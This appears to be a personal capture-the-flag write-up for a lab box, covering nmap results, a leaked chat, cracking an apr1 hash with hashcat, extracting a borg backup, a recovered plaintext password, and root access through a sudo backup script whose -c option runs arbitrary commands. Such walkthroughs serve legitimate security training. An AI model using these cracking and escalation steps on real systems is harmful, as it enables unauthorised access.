# Write up

## Help

### Enumeration
#### Nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


### Info
Potential username: `alex`

Admin section:
```
 ############################################
                ############################################
                [Yesterday at 4.32pm from Josh]
                Are we all going to watch the football game at the weekend??
                ############################################
                ############################################
                [Yesterday at 4.33pm from Adam]
                Yeah Yeah mate absolutely hope they win!
                ############################################
                ############################################
                [Yesterday at 4.35pm from Josh]
                See you there then mate!
                ############################################
                ############################################
                [Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
                ############################################
                ############################################
```

### ETC directory
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. :: squidward

File: music_archive.tar


### Credential: 
music_archive
alex:S3cretP@s3

## keys word
- `Crack hash`
- `backup borg`
- `bash file priv`
- `tar`
## Links
- [[Cryptography]]
- [[Pentesting]]

## Tools
- [[Nmap]]
- [[dirb]]
- https://www.onlinehashcrack.com/hash-identification.php
- [[hashcat]]

## Exploit
### Crack the hash
command: `hascat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt`=> squidward
### Extract backup
command : `borg extract --list final_archive::music_archive 

### Find password for alex
command : `cat Documents/note.txt ` => S3cretP@s3

## Escalate privilege
### Sudo -l
`nopasswd /etc/mp3backup/backup.sh`

### Get root flag
#### Bash file
##### Interesting function
- getopts
- cmd 

We see getopts take `c` option and store it in variable `command` wich wiil be execute by `cmd` => `sudo /etc/mp3backup/backup.sh -c cat /root/root.txt` 